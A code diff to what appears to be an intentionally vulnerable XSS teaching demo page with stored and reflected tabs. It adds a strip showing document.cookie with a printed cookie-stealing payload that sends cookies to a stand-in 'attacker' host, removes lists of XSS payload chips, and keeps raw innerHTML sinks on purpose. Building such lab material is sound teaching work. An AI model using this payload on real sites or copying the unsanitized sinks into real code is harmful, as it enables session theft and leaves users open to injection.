@@ -135,6 +135,19 @@
     .result-snippet { font-size: 12px; color: var(--text-2); line-height: 1.6; }
     .result-snippet .query-echo { font-family: 'Courier New', monospace; }
 
+    /* ── Cookie jar strip ── */
+    .cookie-strip {
+      background: var(--bg-2); border-bottom: 1px solid var(--border);
+      padding: 8px 24px; display: flex; align-items: center; gap: 10px;
+      font-size: 11px; font-family: 'Courier New', monospace;
+    }
+    .cookie-strip-label { color: var(--text-2); white-space: nowrap; font-weight: 700; letter-spacing: .06em; text-transform: uppercase; }
+    .cookie-val { color: var(--yellow); word-break: break-all; flex: 1; }
+    .cookie-strip-note { color: var(--text-2); font-size: 10px; white-space: nowrap; }
+    /* ── Comment delete btn ── */
+    .btn-del { background: none; border: none; color: var(--text-2); font-size: 14px; cursor: pointer; padding: 0 2px; line-height: 1; margin-left: auto; transition: color .15s; }
+    .btn-del:hover { color: var(--red); }
+
     /* ── XSS sink note ── */
     .sink-note {
       font-size: 11px; font-family: 'Courier New', monospace;
@@ -164,6 +177,13 @@
   </div>
 </div>
 
+<!-- ══ COOKIE JAR ══ -->
+<div class="cookie-strip">
+  <span class="cookie-strip-label">🍪 document.cookie</span>
+  <span class="cookie-val" id="cookie-display">—</span>
+  <span class="cookie-strip-note">steal with: &lt;img src=x onerror="fetch('http://attacker/?c='+document.cookie)"&gt;</span>
+</div>
+
 <!-- ════════════════════════════════════════════════════════
      TAB 1 — STORED XSS
      ════════════════════════════════════════════════════════ -->
@@ -172,14 +192,6 @@
 
     <!-- Left -->
     <div class="panel">
-      <div class="explainer stored-exp">
-        <strong>Stored XSS</strong> — the payload is <strong>saved to the database</strong>.
-        Every visitor who loads this page executes it. No interaction from the attacker
-        is needed after the initial injection.<br><br>
-        The vulnerable sink is <code>element.innerHTML = comment.message</code> — raw
-        user input written directly into the DOM.
-      </div>
-
       <div>
         <div class="section-label">Post a Comment</div>
         <div style="display:flex; flex-direction:column; gap:10px;">
@@ -198,21 +210,6 @@
         </div>
       </div>
 
-      <div>
-        <div class="section-label">Payload Chips</div>
-        <div class="chips">
-          <div class="chip s" onclick="setStored('&lt;img src=x onerror=&quot;alert(&#39;Stored XSS!&#39;)&quot;&gt;')">&lt;img onerror&gt;</div>
-          <div class="chip s" onclick="setStored('&lt;svg onload=&quot;alert(document.cookie)&quot;&gt;')">&lt;svg onload&gt;</div>
-          <div class="chip s" onclick="setStored('&lt;b onmouseover=&quot;alert(&#39;hover XSS&#39;)&quot;&gt;Hover me&lt;/b&gt;')">&lt;b onmouseover&gt;</div>
-          <div class="chip s" onclick="setStored('&lt;a href=&quot;javascript:alert(&#39;JS link&#39;)&quot;&gt;Click me&lt;/a&gt;')">&lt;a javascript:&gt;</div>
-          <div class="chip s" onclick="setStored('&lt;iframe src=&quot;javascript:alert(&#39;iframe XSS&#39;)&quot;&gt;&lt;/iframe&gt;')">&lt;iframe&gt;</div>
-          <div class="chip s" onclick="setStored('&lt;script&gt;alert(&#39;will not run via innerHTML&#39;)&lt;/script&gt;')">&lt;script&gt; (blocked)</div>
-        </div>
-        <div class="sink-note" style="margin-top:10px;">
-          ⚠️ <span class="sink">&lt;script&gt;</span> tags injected via <span class="sink">innerHTML</span> are blocked by the HTML5 spec —
-          use event-handler attributes (<span class="sink">onerror</span>, <span class="sink">onload</span>) instead.
-        </div>
-      </div>
     </div>
 
     <!-- Right: comment board -->
@@ -240,14 +237,6 @@
 
     <!-- Left -->
     <div class="panel">
-      <div class="explainer reflected-exp">
-        <strong>Reflected XSS</strong> — the payload lives in the <strong>URL</strong> and is
-        echoed back in the response. It is <em>not</em> stored. The attacker crafts a
-        malicious link and tricks the victim into clicking it.<br><br>
-        Here the frontend reads <code>?q=</code> from the URL and writes it into the DOM
-        via <code>innerHTML</code> — just like an SSR app that echoes a search query.
-      </div>
-
       <div>
         <div class="section-label">Browser URL</div>
         <div class="url-bar-wrap">
@@ -267,14 +256,7 @@
       </div>
 
       <div>
-        <div class="section-label">Payload Chips</div>
-        <div class="chips">
-          <div class="chip r" onclick="setReflected('&lt;img src=x onerror=&quot;alert(&#39;Reflected XSS!&#39;)&quot;&gt;')">&lt;img onerror&gt;</div>
-          <div class="chip r" onclick="setReflected('&lt;svg onload=&quot;alert(location.href)&quot;&gt;')">&lt;svg onload&gt;</div>
-          <div class="chip r" onclick="setReflected('&lt;b onmouseover=&quot;alert(&#39;hover&#39;)&quot;&gt;Results&lt;/b&gt;')">&lt;b onmouseover&gt;</div>
-          <div class="chip r" onclick="setReflected('&lt;script&gt;alert(1)&lt;/script&gt;')">&lt;script&gt; (blocked)</div>
-        </div>
-        <div class="sink-note" style="margin-top:10px;">
+        <div class="sink-note">
           Shareable attack URL: <span class="sink-orange" id="r-attack-url" style="word-break:break-all;">paste a payload above</span>
         </div>
       </div>
@@ -345,8 +327,10 @@
   }
 
   async function loadComments() {
-    const r = await fetch('/api/comments');
+    const r = await fetch('/api/comments', { credentials: 'include' });
     const comments = await r.json();
+    // Refresh cookie display — demo cookies are set by the server in this response
+    document.getElementById('cookie-display').textContent = document.cookie || '(empty — check browser cookie settings)';
 
     const board = document.getElementById('comment-board');
     const count = document.getElementById('s-count');
@@ -362,10 +346,11 @@
     board.innerHTML = comments.map(c => {
       // ⚠ VULNERABLE SINK: message is written with innerHTML — no sanitization
       const isXSS = /<[^>]+>/i.test(c.message);
-      return `<div class="comment-item ${isXSS ? 'xss-comment' : ''}">
+      return `<div class="comment-item ${isXSS ? 'xss-comment' : ''}" id="ci-${c.id}">
         <div class="comment-meta">
           <span class="cname">${escHtml(c.name)}</span>
           ${isXSS ? '<span class="tag stored" style="font-size:9px;">XSS payload</span>' : ''}
+          <button class="btn-del" onclick="deleteComment(${c.id})" title="Remove">✕</button>
         </div>
         <div class="comment-body" id="cb-${c.id}"></div>
       </div>`;
@@ -376,6 +361,11 @@
       const el = document.getElementById('cb-' + c.id);
       if (el) el.innerHTML = c.message;  // ← VULNERABLE SINK
     });
+  }
+
+  async function deleteComment(id) {
+    await fetch('/api/comments/' + id, { method: 'DELETE' });
+    loadComments();
   }
 
   async function resetDemo() {
